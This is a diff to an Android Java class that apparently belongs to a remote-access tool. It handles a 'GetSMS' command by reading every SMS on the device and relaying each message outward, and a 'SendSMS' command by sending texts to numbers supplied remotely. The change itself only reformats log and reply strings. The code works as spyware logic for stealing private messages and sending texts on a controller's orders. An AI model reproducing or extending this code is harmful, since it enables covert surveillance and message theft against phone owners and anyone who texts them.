@@ -36,20 +36,19 @@ public class SMSCommand extends CommandFather{
             switch (rawCommandArray[1]) {
                 case "GetSMS":
                     List<String> smsList;
-                    Log.d(TAG, "GetSMS");
+                    Log.d(TAG, "SMS GetSMS");
                     smsList = sms.getAllSms(context);
                     for (String smsString : smsList) {
-                        this.send(smsString);
+                        this.send("SMS:GetSMS:->"+smsString);
                     }
-                    this.send("GetSMS");
                     break;
 
                 case "SendSMS":
                     String phoneNumber = rawCommandArray[2];
                     String smsText = rawCommandArray[3];
-                    Log.d(TAG, "Send sms to :" + phoneNumber + " text :" + smsText);
+                    Log.d(TAG, "SMS:SendSMS:->" + phoneNumber + "\ntext->" + smsText);
                     sms.sendSMS(context,phoneNumber,smsText);
-                    this.send("Send sms to :" + phoneNumber + " text :" + smsText);
+                    this.send("SMS:SendSMS:->" + phoneNumber + "\ntext->" + smsText);
                     break;
             }
         } catch (Exception e) {
